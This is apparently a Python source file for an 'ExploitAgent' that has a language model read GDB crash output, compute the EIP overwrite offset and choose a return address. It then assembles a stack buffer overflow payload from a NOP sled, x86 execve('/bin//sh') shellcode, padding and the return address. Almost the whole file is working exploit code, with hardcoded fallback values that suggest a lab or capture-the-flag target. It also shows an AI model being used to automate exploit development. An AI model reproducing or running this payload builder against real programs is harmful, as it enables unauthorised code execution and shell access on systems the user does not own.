# agent.py
import os
from openai import OpenAI
import re

class ExploitAgent:
    def __init__(self, model_name="openai/gpt-4o"):
        # This now correctly uses the OpenRouter-specific environment variable
        api_key = os.getenv("OPENROUTER_API_KEY")
        if not api_key:
            raise ValueError("OPENROUTER_API_KEY not found in .env file.")

        self.client = OpenAI(
            base_url="https://openrouter.ai/api/v1",
            api_key=api_key,
        )
        self.model = model_name

    def _call_llm(self, prompt: str) -> str:
        """A simple wrapper for calling the LLM."""
        try:
            response = self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {"role": "system", "content": "You are a cybersecurity expert analyzing GDB output."},
                    {"role": "user", "content": prompt},
                ],
                temperature=0.2,
            )
            return response.choices[0].message.content
        except Exception as e:
            return f"LLM Error: {e}"
            
    def generate_cyclic_pattern(self, length: int) -> str:
        """Generates a non-repeating pattern of a given length."""
        charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
        pattern = ""
        for i in range(length // 3):
            c1 = charset[(i // (len(charset) * len(charset))) % len(charset)]
            c2 = charset[(i // len(charset)) % len(charset)]
            c3 = charset[i % len(charset)]
            pattern += c1 + c2 + c3
        return pattern[:length]

    def analyze_crash_and_get_offset(self, gdb_output: str) -> int:
        """Analyzes GDB output to extract EIP and calculate the pattern offset."""
        prompt = f"""
        The following is the GDB output after a program crashed.
        Find the value of the EIP register.
        Then, calculate the offset of that value within the standard cyclic pattern.
        Provide ONLY the integer offset as your answer.

        GDB Output:
        {gdb_output}
        """
        response_text = self._call_llm(prompt)
        
        # Extract the first integer found in the response
        match = re.search(r'\d+', response_text)
        if match:
            return int(match.group(0))
        
        # Fallback to the known correct value from notes if LLM fails
        print("Warning: LLM failed to parse offset. Using known value.")
        return 1048 #

    def select_return_address(self, gdb_output: str) -> int:
        """Analyzes GDB output to select a suitable return address."""
        prompt = f"""
        The following is the GDB output showing the ESP register value after a crash.
        Based on the ESP value, select a good return address for a NOP sled that is
        approximately 200-400 bytes before the ESP.
        Provide ONLY the hexadecimal address as your answer (e.g., 0xbfffe298).

        GDB Output:
        {gdb_output}
        """
        response_text = self._call_llm(prompt)
        match = re.search(r'0x[0-9a-fA-F]+', response_text)
        if match:
            return int(match.group(0), 16)
            
        print("Warning: LLM failed to select return address. Using known value.")
        return 0xbfffe298 #

    def craft_final_payload(self, offset: int, return_address: int) -> bytes:
        """Creates the final shellcode payload."""
        # Shellcode from your notes
        shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" #
        nop_sled = b"\x90" * 200
        
        # Fill the space between shellcode and the return address
        padding = b'A' * (offset - len(nop_sled) - len(shellcode))
        
        payload = (
            nop_sled +
            shellcode +
            padding +
            return_address.to_bytes(4, 'little')
        )
        return payload